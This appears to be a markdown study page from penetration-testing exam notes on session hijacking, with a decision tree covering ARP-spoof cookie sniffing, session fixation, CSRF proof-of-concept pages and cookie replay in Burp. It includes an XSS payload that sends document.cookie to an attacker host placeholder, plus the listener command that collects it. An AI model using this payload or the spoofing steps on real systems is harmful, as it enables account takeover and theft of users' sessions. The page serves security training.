# 10 — Session Hijacking

> Stealing, forging, or replaying a session so you act as another user. Expect 1–2 questions — usually "capture the session cookie via MITM and reuse it" or "exploit a CSRF/XSS in Burp."

## 🧭 Decision tree — "I see a session hijacking question"

```
How will you get / abuse the session?
│
├── Steal a cookie off the wire (MITM)
│   ├── Ettercap / Bettercap ARP spoof → Wireshark filter `http.cookie`
│   │   → copy Cookie header → replay in Burp Repeater
│   └── Wireshark display filter: http.cookie contains "SESSIONID"
│
├── Steal a cookie via XSS (stored or reflected)
│   └── Inject:  <script>fetch('http://<LHOST>/?c='+document.cookie)</script>
│       On attacker: python3 -m http.server 80
│       Victim triggers → cookie lands in your access log
│
├── Session fixation
│   └── Set victim's cookie to a known value (link with ?SESSID=abc123),
│       wait for them to log in, then use SESSID=abc123 yourself.
│
├── CSRF
│   ├── Burp → Generate CSRF PoC on a state-changing request
│   ├── Host the PoC HTML, trick victim into visiting
│   └── Victim's browser sends their cookie automatically → action executes
│
└── Cookie already in hand?
    └── Burp Repeater → paste into Cookie: header → Send
        Or Firefox EditThisCookie / Storage → paste → refresh.
```

## 📄 Files in this folder

- **[commands.md](commands.md)** — copy-paste recipes and Burp notes
- **[walkthroughs.md](walkthroughs.md)** — full multi-step examples
- Question bank: **[../questions/10-session-hijacking.md](../questions/10-session-hijacking.md)**

## 🛠 Tools used in this domain

- **[burp](../tools/burp.md)** ← the big one (Repeater, Intruder, CSRF PoC generator)
- **[ettercap](../tools/ettercap.md)** — ARP poison for cookie capture
- **[bettercap](../tools/bettercap.md)** — modern MITM
- **[wireshark](../tools/wireshark.md)** — pull cookies from pcap
- **[XSS payloads](../tools/xss.md)** — cookie exfil via JS

## ✅ Domain checklist

- [ ] Intercept a request in Burp and replay it in Repeater
- [ ] Capture a session cookie via ARP spoof + Wireshark (`http.cookie`)
- [ ] Replay a stolen cookie from Burp and see "logged in as <victim>"
- [ ] Write an XSS cookie-stealer payload from memory
- [ ] Generate a CSRF PoC HTML file from a Burp request
- [ ] Explain the difference between session hijacking, fixation, and CSRF
- [ ] Done all questions in [the question bank](../questions/10-session-hijacking.md)
